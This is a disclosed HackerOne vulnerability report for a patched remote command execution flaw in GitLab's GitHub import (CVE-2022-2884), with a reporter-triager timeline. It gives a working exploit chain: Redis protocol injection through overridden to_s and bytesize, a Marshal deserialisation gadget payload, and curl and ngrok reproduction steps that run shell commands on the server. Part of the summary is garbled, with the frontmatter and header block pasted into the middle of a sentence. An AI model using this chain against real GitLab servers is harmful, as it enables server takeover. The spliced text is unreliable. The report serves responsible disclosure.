---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/gitlab
  - vuln/command-injection
  - vuln/deserialization
  - impact/rce
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2022-10-06
submitted: 2022-08-25T04:07:52.077Z
bounty_usd: 33510
votes: 392
cve: "CVE-2022-2884"
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/1679624"
title: "Remote Command Execution via Github import"
---
# Remote Command Execution via Github import

> **Severity:** Critical | **Bounty:** 33,510 USD | **Votes:** 392 | **Program:** GitLab | **Disclosed:** 2022-10-06

- Report: [https://hackerone.com/reports/1679624](https://hackerone.com/reports/1679624)
- CWE: Command Injection - Generic | CVE: CVE-2022-2884
- Submitted: 2022-08-25T04:07:52.077Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

### Summary

This is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#Remote%20Command%20Execution%20via%20Github%20import and allows arbitrary redis commands to be injected when imported a GitHub repository.

When importing a GitHub repo the api client uses `Sawyer` for handling the responses. This takes a json hash and converts it into a ruby class that has methods matching all of the keys:

https://github.com/lostisland/sawyer/blob/v0.9.2/lib/sawyer/resource.rb#L106-L110
```ruby
    def self.attr_accessor(*attrs)
      attrs.each do |attribute|
        class_eval do
          define_method attribute do
            @attrs[attribute.to_sym]
          end

          define_method "#{attribute}=" do |value|
            @attrs[attribute.to_sym] = value
          end

          define_method "#{attribute}?" do
            !!@attrs[attribute.to_sym]
          end
        end
      end
    end
```

This happens recursively, and allows for any method to be overridden including built-in methods such as `to_s`.

The redis gem uses `to_s` and `bytesize` to generate the RESP command, so if a `Sawyer::Resource` is ever passed in that has a controllable hash it can allow arbitrary redis commands to be injected into the stream as the string will be shorter than the `---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
date: 2022-10-06
submitted: 2022-08-25T04:07:52.077Z
bounty_usd: 33510
votes: 392
cve: "CVE-2022-2884"
program: "[[programs/gitlab|GitLab]]"
reporter: "vakzz"
source: "https://hackerone.com/reports/1679624"
title: "Remote Command Execution via Github import"
---
# Remote Command Execution via Github import

> **Severity:** Critical | **Bounty:** 33,510 USD | **Votes:** 392 | **Program:** GitLab | **Disclosed:** 2022-10-06

- Report: [https://hackerone.com/reports/1679624](https://hackerone.com/reports/1679624)
- CWE: Command Injection - Generic | CVE: CVE-2022-2884
- Submitted: 2022-08-25T04:07:52.077Z
 size provided (see https://redis.io/docs/reference/protocol-spec/)

https://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L20
```ruby
            i = i.to_s
            command << "$#{i.bytesize}"
            command << i
```

The patch for CVE-2022-2884 added validation to `Gitlab::Cache::Import::Caching` but there is another spot where the  `Sawyer::Resource` is passed to redis:

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/github_import/importer/repository_importer.rb#L55
```ruby
       def import_repository
          project.ensure_repository

          refmap = Gitlab::GithubImport.refmap
          project.repository.fetch_as_mirror(project.import_url, refmap: refmap, forced: true)

          project.change_head(default_branch) if default_branch

          # The initial fetch can bring in lots of loose refs and objects.
          # Running a `git gc` will make importing pull requests faster.
          Repositories::HousekeepingService.new(project, :gc).execute

          true
        end
```

The `default_branch` param comes from the client repository (which is a nested Sawyer::Resource of attacker controlled data), and is passed to `change_head`  which then calls `branch_exists?`  and `branch_names_include?` which passes the value to redis:

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/repository_cache_adapter.rb#L71
```ruby
        define_method("#{name}_include?") do |value|
          ivar = "@#{name}_include"
          memoized = instance_variable_get(ivar) || {}
          lookup = proc { __send__(name).include?(value) } # rubocop:disable GitlabSecurity/PublicSend

          next memoized[value] if memoized.key?(value)

          memoized[value] =
            if strong_memoized?(name)
              lookup.call
            else
              result, exists = redis_set_cache.try_include?(name, value)

              exists ? result : lookup.call
            end

          instance_variable_set(ivar, memoized)[value]
        end
```

So by returning an api response with a `default_branch` that overrides `to_s` and `bytesize` you can call arbitrary redis commands:

```json
        {
            "default_branch": {
                "to_s": {
                    "to_s": 'ggg\r\nINJECT_RESP_HERE',
                    "bytesize": 3,
                }
            }
        }
```

This can be combined with a call to `Marshal.load` when loading a _gitlab_session to execute a deserialisation gadget (such as https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) and gain RCE.

### Steps to reproduce

1. edit {F1882976} and change the command at `git_set`, that will be the command that is executed
1. change the `session:gitlab:gggg`  to be something other than `gggg`
1. run `ruby ./gen_payload3.rb` and copy the payload
1. edit {F1882972} and update the payload
1. run `ngrok http 5000` and copy the url
1. edit `fake_server3.py` and update the ngrok url
1. run the server with `FLASK_APP=fake_server3.py flask run`
1. run `curl --request POST --url "http://gitlab.wbowling.info/api/v4/import/github"  --header "content-type: application/json" --header "PRIVATE-TOKEN: API_TOKEN" --data "{\"personal_access_token\": \"fake_token\",\"repo_id\": \"12345\",\"target_namespace\": \"root\",\"new_name\": \"gh-import-$RANDOM\",\"github_hostname\": \"https://9895-45-248-49-157.ngrok.io\"}"` replacing `gitlab.wbowling.info` with your gitlab url, `API_TOKEN` with a valid gitlab token, `target_namespace` with a namespace you have access to, and `github_hostname` with your ngrok url
1. wait a minute or so, you should see requests coming in to the flask app. Once you see a request for `/api/v3/repos/fake/name` that should be long enough, there will also be an error in `/var/log/gitlab/gitlab-rails/exceptions_json.log` about `comparison of String with 0 failed`
1. run `curl -v 'http://gitlab.wbowling.info/root' -H 'Cookie: _gitlab_session=gggg'` replacing `gitlab.wbowling.info` with your gitlab url and `gggg` with the string you used in `gen_payload3.rb`
1. the payload should have executed

### Impact

Allows an attacker with the ability to import a github repo to execute arbitrary commands on the server

### Examples

See attached scripts and steps to reproduce

### What is the current *bug* behavior?

The `Sawyer::Resource` object is passed around and allows an attacker to override builtin methods

### What is the expected *correct* behavior?

The `Sawyer::Resource` has a `to_h` method which could potentially be used to ensure a plain has it passed around.

### Relevant logs and/or screenshots
redis command ends up as:
```
[pid  1362] read(67, "*1\r\n$5\r\nmulti\r\n*3\r\n$9\r\nsismember\r\n$53\r\ncache:gitlab:branch_names:root/gh-import-7316:102:set\r\n$3\r\nggg\r\n*3\r\n$3\r\nset\r\n$19\r\nsession:gitlab:jjjj\r\n$330\r\n\4\10[\10c\25Gem::SpecFetcherc\23Gem::InstallerU:\25Gem::Requirement[\6o:\34Gem::Package::TarReader\6:\10@ioo:\24Net::BufferedIO\7;\7o:#Gem::Package::TarReader::Entry\7:\n@readi\0:\f@headerI\"\10aaa\6:\6ET:\22@debug_outputo:\26Net::WriteAdapter\7:\f@socketo:\24Gem::RequestSet\7:\n@setso;\16\7;\17m\vKernel:\17@method_id:\vsystem:\r@git_setI\"\33echo id > /tmp/vakzz22\6;\fT;\22:\fresolve\r\n*2\r\n$6\r\nexists\r\n$53\r\ncache:gitlab:branch_names:root/gh-import-7316:102:set\r\n*1\r\n$4\r\nexec\r\n", 16384) = 570
```

error in the logs
```json
{"severity":"ERROR","time":"2022-08-25T03:57:55.006Z","correlation_id":"01GB9JCB7TYNH6F7J7W7NFQTDT","exception.class":"ArgumentError","exception.message":"comparison of String with 0 failed","exception.backtrace":["lib/gitlab/set_cache.rb:60:in `block in try_include?'","lib/gitlab/redis/wrapper.rb:23:in `block in with'","lib/gitlab/redis/wrapper.rb:23:in `with'","lib/gitlab/set_cache.rb:74:in `with'","lib/gitlab/set_cache.rb:59:in `try_include?'","lib/gitlab/repository_cache_adapter.rb:71:in `block in cache_method_as_redis_set'","app/models/repository.rb:288:in `branch_exists?'","app/models/repository.rb:1161:in `change_head'","app/models/concerns/has_repository.rb:17:in `change_head'","lib/gitlab/github_import/importer/repository_importer.rb:55:in `import_repository'","lib/gitlab/github_import/importer/repository_importer.rb:37:in `execute'","app/workers/gitlab/github_import/stage/import_repository_worker.rb:31:in `import'","app/workers/concerns/gitlab/github_import/stage_methods.rb:37:in `try_import'","app/workers/concerns/gitlab/github_import/stage_methods.rb:20:in `perform'","lib/gitlab/database/load_balancing/sidekiq_server_middleware.rb:26:in `call'","lib/gitlab/sidekiq_middleware/duplicate_jobs/strategies/until_executing.rb:16:in `perform'","lib/gitlab/sidekiq_middleware/duplicate_jobs/duplicate_job.rb:58:in `perform'","lib/gitlab/sidekiq_middleware/duplicate_jobs/server.rb:8:in `call'","lib/gitlab/sidekiq_middleware/worker_context.rb:9:in `wrap_in_optional_context'","lib/gitlab/sidekiq_middleware/worker_context/server.rb:19:in `block in call'","lib/gitlab/application_context.rb:110:in `block in use'","lib/gitlab/application_context.rb:110:in `use'","lib/gitlab/application_context.rb:52:in `with_context'","lib/gitlab/sidekiq_middleware/worker_context/server.rb:17:in `call'","lib/gitlab/sidekiq_status/server_middleware.rb:7:in `call'","lib/gitlab/sidekiq_versioning/middleware.rb:9:in `call'","lib/gitlab/sidekiq_middleware/query_analyzer.rb:7:in `block in call'","lib/gitlab/database/query_analyzer.rb:37:in `within'","lib/gitlab/sidekiq_middleware/query_analyzer.rb:7:in `call'","lib/gitlab/sidekiq_middleware/admin_mode/server.rb:14:in `call'","lib/gitlab/sidekiq_middleware/instrumentation_logger.rb:9:in `call'","lib/gitlab/sidekiq_middleware/batch_loader.rb:7:in `call'","lib/gitlab/sidekiq_middleware/extra_done_log_metadata.rb:7:in `call'","lib/gitlab/sidekiq_middleware/request_store_middleware.rb:10:in `block in call'","lib/gitlab/with_request_store.rb:17:in `enabling_request_store'","lib/gitlab/with_request_store.rb:10:in `with_request_store'","lib/gitlab/sidekiq_middleware/request_store_middleware.rb:9:in `call'","lib/gitlab/sidekiq_middleware/server_metrics.rb:76:in `block in call'","lib/gitlab/sidekiq_middleware/server_metrics.rb:103:in `block in instrument'","lib/gitlab/metrics/background_transaction.rb:33:in `run'","lib/gitlab/sidekiq_middleware/server_metrics.rb:103:in `instrument'","lib/gitlab/sidekiq_middleware/server_metrics.rb:75:in `call'","lib/gitlab/sidekiq_middleware/monitor.rb:10:in `block in call'","lib/gitlab/sidekiq_daemon/monitor.rb:49:in `within_job'","lib/gitlab/sidekiq_middleware/monitor.rb:9:in `call'","lib/gitlab/sidekiq_middleware/size_limiter/server.rb:13:in `call'","lib/gitlab/sidekiq_logging/structured_logger.rb:21:in `call'"],"user.username":"root","tags.program":"sidekiq","tags.locale":"en","tags.feature_category":"importers","tags.correlation_id":"01GB9JCB7TYNH6F7J7W7NFQTDT","extra.sidekiq":{"retry":5,"queue":"github_importer:github_import_stage_import_repository","version":0,"queue_namespace":"github_importer","dead":false,"memory_killer_memory_growth_kb":50,"memory_killer_max_memory_growth_kb":300000,"status_expiration":1800,"args":["[FILTERED]"],"class":"Gitlab::GithubImport::Stage::ImportRepositoryWorker","jid":"f6fd0ce785d6cc8e91b5b776","created_at":1661399872.1377518,"correlation_id":"01GB9JCB7TYNH6F7J7W7NFQTDT","meta.caller_id":"RepositoryImportWorker","meta.remote_ip":"192.168.0.149","meta.feature_category":"importers","meta.user":"root","meta.project":"root/gh-import-7316","meta.root_namespace":"root","meta.client_id":"user/1","meta.root_caller_id":"POST /api/:version/import/github","worker_data_consistency":"always","idempotency_key":"resque:gitlab:duplicate:github_importer:github_import_stage_import_repository:797f481f035041a27c840a58899f1557fc2a102dfc05bc2cb918651c86da1219","size_limiter":"validated","enqueued_at":1661399872.1395159},"extra.import_type":"github","extra.project_id":102,"extra.source":"Gitlab::GithubImport::Stage::ImportRepositoryWorker"}
```


### Output of checks

#### Results of GitLab environment info

```
System information
System:		Ubuntu 20.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.5p203
Gem Version:	3.1.6
Bundler Version:2.3.15
Rake Version:	13.0.6
Redis Version:	6.2.7
Sidekiq Version:6.4.0
Go Version:	unknown

GitLab information
Version:	15.3.1-ee
Revision:	518311979e3
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.10
URL:		http://gitlab.wbowling.info
HTTP Clone URL:	http://gitlab.wbowling.info/some-group/some-project.git
SSH Clone URL:	git@gitlab.wbowling.info:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.10.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
```

## Impact

Allows an attacker with the ability to import a github repo to execute arbitrary commands on the server

## Timeline

- **Report Filed**
- **2022-08-25** @vakzz: I have not tested this on gitlab.com at the request of @dcouture since injecting redis commands can have follow on effects and break subsequent commands. I believe it should be vulnerable though from what I can see.

Cheers,
Will
- **2022-08-25** @rshambhuni: Hello @vakzz, thanks for this report! I'm trying to reproduce this on my latest Omnibus installation. I'll let you know if I have any questions.
- **2022-08-25** @rshambhuni: @vakzz I’m at Step 11 of steps to reproduce and I don’t see the payload, `;touch /home/shambho/pwned.txt;# `, execute on my VM. 

All the steps until Step 10 work as you described. I see the project getting imported under the `target_namespace`. See {F1883274}

I'm seeing the error, `comparison of String with 0 failed` in `/var/log/gitlab/gitlab-rails/exceptions_json.log`. See {F1883273}

The following are the curl commands I'm using:
```
curl --request POST --url "http://gitlab.example.com/api/v4/import/github" --header "content-type: application/json" --header "PRIVATE-TOKEN: GITLAB_TOKEN" --data "{\"personal_access_token\": \"fake_token\",\"repo_id\": \"12345\",\"target_namespace\": \"test-group\",\"new_name\": \"gh-import-764\",\"github_hostname\": \"NGROK_URL\"}"

curl -v 'http://gitlab.example.com/test-group' -H 'Cookie: _gitlab_session=SESSION_ID'
```

Payload generated using `gen_payload3.rb` is:
```
"ggg\r\n*3\r\n$3\r\nset\r\n$47\r\nsession:gitlab:SESSION_ID\r\n$341\r\n\u0004\b[\bc\u0015Gem::SpecFetcherc\u0013Gem::InstallerU:\u0015Gem::Requirement[\u0006o:\u001cGem::Package::TarReader\u0006:\b@ioo:\u0014Net::BufferedIO\u0007;\u0007o:#Gem::Package::TarReader::Entry\u0007:\n@readi\u0000:\f@headerI\"\baaa\u0006:\u0006ET:\u0012@debug_outputo:\u0016Net::WriteAdapter\u0007:\f@socketo:\u0014Gem::RequestSet\u0007:\n@setso;\u000e\u0007;\u000fm\u000bKernel:\u000f@method_id:\u000bsystem:\r@git_setI\"&;touch /home/shambho/pwned.txt;# \u0006;\fT;\u0012:\fresolve"
```

I'm reproducing this on the latest Omnibus installation, 15.3.1, on my Ubuntu VM. Let me know how if you have any ideas on where I may be going wrong?
- **2022-08-25** @vakzz: Hi @rshambhuni,

Would you be able to open a rails console with `sudo gitlab-rails console` and see if the redis key has been set (replacing gggg with the value you used):

```ruby
Gitlab::Redis::Cache.with { |r| r.get("session:gitlab:gggg") }
```
 
It should return the payload if the injection worked. Maybe the session id has to be lowercase? Are there any errors in the log about a redis error? Something similar to `ERR unknown command` (will start with `ERR`).

Cheers,
Will
- **2022-08-25** @rshambhuni: ```ruby
Gitlab::Redis::Cache.with { |r| r.get("session:gitlab:14e24d14563863445114a95e195f1144") }
```
The above command returned the payload as you suggested. See screenshot below:
{F1883355}

I unfortunately don't see the `pwned.txt` file created in my home directory though. Not sure if this is an issue with my local Omnibus installation?
- **2022-08-25** @vakzz: Oh gitlab is running as the `git` user, maybe it can’t write to your home directory? Try something like `id > /tmp/pwned.txt` as the command instead?

Cheers, Will
- **2022-08-25** @rshambhuni: @vakzz I tried `echo pwned > /tmp/pwned.txt` command as well but still no luck. I don't see `pwned.txt` under `/tmp`. See attached screenshot:
{F1883458}

Attaching my {F1883460}, {F1883461} and {F1883462} files for your reference. {F1883462} is the payload generated when I run `ruby gen_payload3.rb > payload.txt`.
- **2022-08-25** @vakzz: @rshambhuni Ok I think I see what's happening, the command is being executed with `sh -c 'COMMAND'` and when it starts with a `;` then it has an invalid syntax error:

```bash
vagrant@gitlab:~$ sh -c ';echo pwned > /tmp/pwned.txt;;# '
sh: -c: line 0: syntax error near unexpected token `;'
sh: -c: line 0: `;echo pwned > /tmp/pwned.txt;;# '
vagrant@gitlab:~$
```

Try just using `echo pwned > /tmp/pwned.txt` directly without any other characters, eg `rs.instance_variable_set('@git_set', 'echo pwned > /tmp/pwned.txt');` (you can confirm that it is valid by passing the same string to `sh -c 'COMMAND'` and seeing if it is successful).

To test the unmarshal gadget you could try to manually run it in a rails console with:

```ruby
Gitlab::Redis::Cache.with { |r| Marshal.load(r.get("session:gitlab:14e24d14563863445114a95e195f1144")) }
```

or add `Marshal.load(payload)` to the end of the `gen_payload3.rb` script which will try to execute it (there will be some errors but the shell script should still run).

Cheers,
Will
- **2022-08-25** @rshambhuni: @vakzz Still no luck getting the RCE when I set `rs.instance_variable_set('@git_set', 'echo pwned > /tmp/pwned.txt')` in `gen_payload3.rb`. Attaching my files with this comment again - {F1883531}, {F1883532}, {F1883533}

```ruby
Gitlab::Redis::Cache.with { |r| Marshal.load(r.get("session:gitlab:14e24d14563863445114a95e195f1144")) }
```
Running the above unmarshal gadget manually from the rails console is creating a `pwned.txt` file in `/tmp` though so looks like payload is set correctly. Not sure why it isn't firing when I run the curl command to trigger it?

`curl -v 'http://gitlab.example.com/test-group' -H 'Cookie: _gitlab_session=14e24d14563863445114a95e195f1144'`
- **2022-08-25** @vakzz: Hmm everything looks good, I ran the same payload and server as you and the curl command returns a 500 error and the payload is run:
```
curl -v 'http://gitlab.wbowling.info/test-group' -H 'Cookie: _gitlab_session=14e24d14563863445114a95e195f1144'
*   Trying 192.168.0.122:80...
* Connected to gitlab.wbowling.info (192.168.0.122) port 80 (#0)
> GET /test-group HTTP/1.1
> Host: gitlab.wbowling.info
> User-Agent: curl/7.77.0
> Accept: */*
> Cookie: _gitlab_session=14e24d14563863445114a95e195f1144
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 Internal Server Error
< Server: nginx
< Date: Thu, 25 Aug 2022 11:30:41 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 3049
< Connection: keep-alive
< X-Gitlab-Custom-Error: 1
< X-Request-Id: 01GBAC9H825Z39Z1RFXMBN11M3
< X-Runtime: 0.179455
< 
```

From `sudo gitlab-ctl tail`:

```
==> /var/log/gitlab/gitlab-rails/production.log <==
Started GET "/test-group" for 192.168.0.149 at 2022-08-25 11:30:41 +0000

==> /var/log/gitlab/puma/puma_stderr.log <==
sh: reading: command not found

==> /var/log/gitlab/gitlab-rails/production.log <==

TypeError (no implicit conversion of nil into String):

lib/gitlab/database/load_balancing/rack_middleware.rb:68:in `sticking_namespaces'
lib/gitlab/database/load_balancing/rack_middleware.rb:39:in `unstick_or_continue_sticking'
lib/gitlab/database/load_balancing/rack_middleware.rb:21:in `call'
lib/gitlab/middleware/rails_queue_duration.rb:33:in `call'
lib/gitlab/metrics/rack_middleware.rb:16:in `block in call'
lib/gitlab/metrics/web_transaction.rb:46:in `run'
lib/gitlab/metrics/rack_middleware.rb:16:in `call'
lib/gitlab/jira/middleware.rb:19:in `call'
lib/gitlab/middleware/go.rb:20:in `call'
lib/gitlab/etag_caching/middleware.rb:21:in `call'
lib/gitlab/middleware/query_analyzer.rb:11:in `block in call'
lib/gitlab/database/query_analyzer.rb:37:in `within'
lib/gitlab/middleware/query_analyzer.rb:11:in `call'
lib/gitlab/middleware/multipart.rb:173:in `call'
lib/gitlab/middleware/read_only/controller.rb:50:in `call'
lib/gitlab/middleware/read_only.rb:18:in `call'
lib/gitlab/middleware/same_site_cookies.rb:27:in `call'
lib/gitlab/middleware/handle_malformed_strings.rb:21:in `call'
lib/gitlab/middleware/basic_health_check.rb:25:in `call'
lib/gitlab/middleware/handle_ip_spoof_attack_error.rb:25:in `call'
lib/gitlab/middleware/request_context.rb:21:in `call'
lib/gitlab/middleware/webhook_recursion_detection.rb:15:in `call'
config/initializers/fix_local_cache_middleware.rb:11:in `call'
lib/gitlab/middleware/compressed_json.rb:26:in `call'
lib/gitlab/middleware/rack_multipart_tempfile_factory.rb:19:in `call'
lib/gitlab/middleware/sidekiq_web_static.rb:20:in `call'
lib/gitlab/metrics/requests_rack_middleware.rb:77:in `call'
lib/gitlab/middleware/release_env.rb:13:in `call'
```

And the file is created:
```
vagrant@gitlab:~$ cat /tmp/pwned.txt
pwned
```

Unless your cookie name is something other than `_gitlab_session` for some reason? If you do a `curl -v 'http://gitlab.wbowling.info/test-group'` (for your host) does it use `_gitlab_session` for the cookie? `Set-Cookie: _gitlab_session=828ea5fe1ef1b668cd9d09922a8cd285; path=/; expires=Thu, 25 Aug 2022 13:36:25 GMT; HttpOnly`.

There are probably other redis keys that could be used, this was just the simplest to target but not sure why it's not working for you.

Cheers,
Will
- **2022-08-25** @rshambhuni: @vakzz I did a `curl -v 'http://gitlab.example.com/test-group'` and the cookie is being set as `_gitlab_session` so no issues there either. I'm thinking this could be an issue with my Ubuntu VM that is running the Omnibus instance. We will have to reproduce this report on a different instance as a sanity check.
- **2022-08-25** @dcouture: Hello @vakzz,

Thank you for submitting this report.

We have verified this finding and have escalated to our engineering team.  We will be tracking progress internally at <issue link>.  This issue will be made public 30 days following the release of a patch.

Given the severity of the report, we are paying an initial $1000 on triage. Congratulations!

We will continue to update you via HackerOne as a patch is scheduled for release.

Best regards,
Dominic
GitLab Security Team
- **Bounty Awarded**
- **Report Triaged**
- **Bounty Awarded**
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
